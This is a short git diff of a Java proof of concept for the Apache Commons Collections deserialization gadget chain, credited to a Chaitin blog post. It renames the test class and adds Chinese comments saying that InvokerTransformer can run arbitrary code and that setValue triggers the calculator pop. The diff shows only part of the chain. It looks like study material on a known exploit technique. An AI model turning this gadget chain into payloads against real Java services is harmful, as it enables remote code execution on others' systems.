@@ -12,9 +12,10 @@ import org.apache.commons.collections.map.TransformedMap;
 
 /*
  * code from https://blog.chaitin.cn/2015-11-11_java_unserialize_rce/
+ * 这段代码是为了证明InvokerTransformer有执行任意代码的能力
  */
 
-public class testchang {
+public class InvokerTransformerTest {
 	public static void main(String[] args) throws Exception {
 	    Transformer[] transformers = new Transformer[] {
 	        new ConstantTransformer(Runtime.class),
@@ -35,7 +36,7 @@ public class testchang {
 	    Map outerMap = TransformedMap.decorate(innerMap, null, transformedChain);
 
 	    Map.Entry onlyElement = (Entry) outerMap.entrySet().iterator().next();
-	    onlyElement.setValue("foobar");
+	    onlyElement.setValue("foobar");//触发点，必须要修改键值才可以弹计算器
 
 	}
 }
